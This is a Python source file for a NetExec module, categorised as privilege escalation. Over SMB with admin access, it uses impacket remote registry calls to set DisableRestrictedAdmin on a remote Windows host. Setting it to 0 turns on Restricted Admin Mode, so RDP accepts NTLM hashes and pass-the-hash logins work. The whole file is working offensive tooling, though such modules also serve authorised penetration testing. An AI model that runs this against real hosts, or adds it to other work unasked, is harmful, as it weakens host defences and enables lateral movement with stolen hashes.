from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """Module by @mverschu — set DisableRestrictedAdmin under HKLM\\System\\CurrentControlSet\\Control\\Lsa"""
    name = "restricted-admin"
    description = 'Enable or disable Restricted Admin Mode (RDP using NTLM hash)'
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = None

    def options(self, context, module_options):
        """
        ACTION  Enable/Disable Restricted Admin Mode (choices: enable, disable)
                - enable:  Set DisableRestrictedAdmin = 0 (allows RDP with NTLM hash instead of interactive password)
                - disable: Set DisableRestrictedAdmin = 1 (default behavior, requires interactive password)
        """
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            return

        action = module_options["ACTION"].lower().strip()

        if action not in ["enable", "disable"]:
            context.log.fail("Invalid value for ACTION option! Use 'enable' or 'disable'.")
            return

        self.action = action
        context.log.debug(f"ACTION parsed: {self.action}")

    def on_admin_login(self, context, connection):
        if self.action is None:
            context.log.fail("Module not configured correctly. Run with ACTION option.")
            return

        remote_ops = None
        try:
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()
            if not remote_ops._RemoteOperations__rrp:
                context.log.fail("Failed to obtain a registry handle.")
                return

            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]

            key_path = "System\\CurrentControlSet\\Control\\Lsa"
            try:
                key_handle = rrp.hBaseRegOpenKey(
                    remote_ops._RemoteOperations__rrp, reg_handle, key_path
                )["phkResult"]
            except Exception as e:
                context.log.debug(f"Key open failed ({e}), attempting to create key '{key_path}'")
                key_handle = rrp.hBaseRegCreateKey(
                    remote_ops._RemoteOperations__rrp, reg_handle, key_path
                )["phkResult"]

            value_name = "DisableRestrictedAdmin\x00"
            value = 0 if self.action == "enable" else 1

            try:
                cur = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, value_name)
                context.log.debug("Existing value queried (info): %s" % repr(cur))
            except Exception as e:
                if "ERROR_FILE_NOT_FOUND" in str(e):
                    context.log.debug(f"Registry value '{value_name.strip(chr(0))}' does not exist; it will be created.")
                else:
                    context.log.debug(f"Query raised: {e} — will attempt to set the value anyway.")

            rrp.hBaseRegSetValue(
                remote_ops._RemoteOperations__rrp,
                key_handle,
                value_name,
                rrp.REG_DWORD,
                value,
            )

            if self.action == "enable":
                context.log.success(
                    "DisableRestrictedAdmin set to 0 — Restricted Admin Mode enabled (RDP now accepts NTLM hashes instead of only interactive passwords)."
                )
            else:
                context.log.success(
                    "DisableRestrictedAdmin set to 1 — Restricted Admin Mode disabled (default behavior restored)."
                )

        except Exception as e:
            context.log.fail(f"Error while setting DisableRestrictedAdmin: {e}")
        finally:
            try:
                if remote_ops:
                    remote_ops.finish()
            except Exception:
                pass
